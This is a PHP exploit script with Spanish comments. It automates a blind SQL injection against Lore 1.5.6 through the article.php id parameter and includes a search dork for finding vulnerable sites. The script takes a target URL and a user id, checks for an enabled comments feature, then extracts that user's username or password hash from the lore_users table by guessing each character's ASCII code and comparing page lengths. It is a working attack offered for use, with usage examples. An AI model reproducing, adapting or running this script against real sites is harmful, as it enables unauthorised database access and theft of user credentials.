&lt;?
/* *** CURL HABILITADO ****
Blind Sql Injections 
Script Version : &gt;Lore 1.5.6 
Bug : &gt; article.php?id=Blind ,Comentarios Habilitados * &quot;Add Comment&quot;
Dork : &gt; intext:&quot;Powered by Lore 1.5.6&quot;
Coded By OzX[NuKE/US]
HTTP://FORO.UNDERSECURITY.NET
HTTP://FORO.EL-HACKER.COM
Gracias C1c4tr1z,Tecn0x,Lix,1995,N0b0dy,NanonRoses,Codebreak(?),Nork,Azrael[NuKE] &amp;&amp; Todos los Miembros de UnderSecurity.net
100% CHILE

*/

set_time_limit (0); 
function GET($url) {
		$curl = curl_init();
	 	$header[] = &quot;Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5&quot;;
		$header[] = &quot;Cache-Control: max-age=0&quot;;
		$header[] = &quot;Connection: keep-alive&quot;;
		$header[] = &quot;Keep-Alive: 300&quot;;
		$header[] = &quot;Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7&quot;;
		$header[] = &quot;Accept-Language: en-us,en;q=0.5&quot;;
		$header[] = &quot;Pragma: &quot;; 
	 	curl_setopt($curl, CURLOPT_URL, $url);
		curl_setopt($curl, CURLOPT_USERAGENT, &#039;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.15) Gecko/2008111317  Firefox/3.0.4&#039;);
		curl_setopt($curl, CURLOPT_HTTPHEADER, $header);
		curl_setopt($curl, CURLOPT_REFERER, &#039;http://www.google.com&#039;);
		curl_setopt($curl, CURLOPT_ENCODING, &#039;gzip,deflate&#039;);
		curl_setopt($curl, CURLOPT_AUTOREFERER, true);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($curl, CURLOPT_TIMEOUT, 10);
		if (!$html = curl_exec($curl)) { 
		$html = file_get_contents($url);
						 }
		curl_close($curl);
	return $html; 
	}

function contar($host){
return count(explode(&quot;\n&quot;,GET($host)));
	}
function sql($sql,$i){ 
return &quot;+and+ascii(substring((&quot;.$sql.&quot;),&quot;.$i.&quot;,1))=&quot;;
	}

function genera_ansii(){
for ($x=45;$x&lt;=122;$x++){ //0-9 a-z &amp;&amp; _
	if ($x==47){ // /
	$x++;
	}
	if ($x==58){
		$x=$x+37;
	}
	if($x==96){//sacamos el &#039;
	$x++;
	}

$ansi[]=$x;
			}
return $ansi;
			}

$url = $argv[1]; 
$id = $argv[2];
$opt = $argv[3];

if (count($argv)!=4){
	echo &quot;BLIND SQL INJECTION Lore 1.5.6 By OzX\n&quot;;
	echo &quot;USO :&gt; php &quot;.$argv[0].&quot; url id -u [Obtener Usuario]\n&quot;;
	echo &quot;USO :&gt; php &quot;.$argv[0].&quot;p url id -p [Obtener Password]\n&quot;;
	echo &quot;Ejemplo :&gt; php &quot;.$argv[0].&quot;.php http://www.website.com/article.php?id=009 1 -u \n&quot;;
}else{

	preg_match_all(&quot;/(comment\.php\?article_id)/&quot;, GET($url), $dat,  PREG_SET_ORDER);
	if (!$dat){
		echo &quot;ERROR NO VULNERABLE | POSIBLEMENTE COMENTARIOS NO HABILITADOS\n&quot;;
	}else{

		echo &quot;BLIND SQL INJECTION Lore 1.5.6 By OzX\n&quot;;
		if ($opt == &quot;-u&quot;){
		$var = &quot;username&quot;;
		}elseif($opt == &quot;-p&quot;){
			$var = &quot;password&quot;;
		}else{
			echo &quot;[+] Parametros Incorrectos \n&quot;;
			exit();
		}

		echo $var.&quot;:\n&quot;;
		$ansi = genera_ansii(); 
		$query = &quot;select+&quot;.$var.&quot;+from+lore_users+where+id=&quot;.$id;
		$original = contar($url);
		$i=1;
		for ($x=0;$x&lt;=count($ansi);$x++){
			$var = $ansi[$x];
			$urlblind = $url.sql($query.&quot;+limit+0,1&quot;,$i).$var; 
			$blind = contar($urlblind);
				if ($blind == $original){
					$name.=chr($var);
					//system(&quot;clear&quot;); //Linux
					echo &quot;  :&gt; &quot;.$name.chr(8);
					$i++;
					$x=-1;
							}
			echo chr($var).chr(13);
		}
	echo &quot;\nResultado :&gt; &quot;.$name.&quot;\n&quot;;
	}

}


?&gt;
